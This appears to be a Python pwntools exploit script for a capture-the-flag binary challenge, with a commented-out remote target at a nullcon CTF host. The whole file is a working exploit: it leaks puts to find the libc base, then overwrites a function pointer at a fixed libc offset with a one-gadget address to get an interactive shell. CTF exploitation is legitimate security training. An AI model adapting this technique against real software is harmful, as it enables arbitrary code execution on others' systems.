from pwn import *
envi={"LD_PRELOAD":"/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so"}
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./pwn'],env=envi)
#target=remote('pwn1.ctf.nullcon.net' ,8000)
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="pie breakpoint *(0x994-0x201000)")
#gdb.attach(target)

def read(addr):
	print(target.recvline())
	target.sendline("r")
	print(target.recvline())
	target.sendline(str(addr))
	print(target.recvline())
	leak=target.recvline().strip("\n")

def game(randv):
	print(target.recvline())
	target.sendline("g")
	target.sendline(str(randv))
	libc_puts=int(target.recvline().strip("\n"),16)
	return libc_puts

def write(addr,val):
	print(target.recvline())
	target.sendline("w")
	print(target.recvline())
	target.sendline(str(addr))
	print(target.recvline())
	target.sendline(str(val))
	
libc_puts=game(0x2d365625)
libc_base=libc_puts-libc.symbols["puts"]

gadget=0xe569f
libc_gadget=libc_base+gadget

calloff=0x81af60
libc_call=libc_base+calloff

write(libc_call,libc_gadget)

target.sendline("q")
target.interactive()




	
	
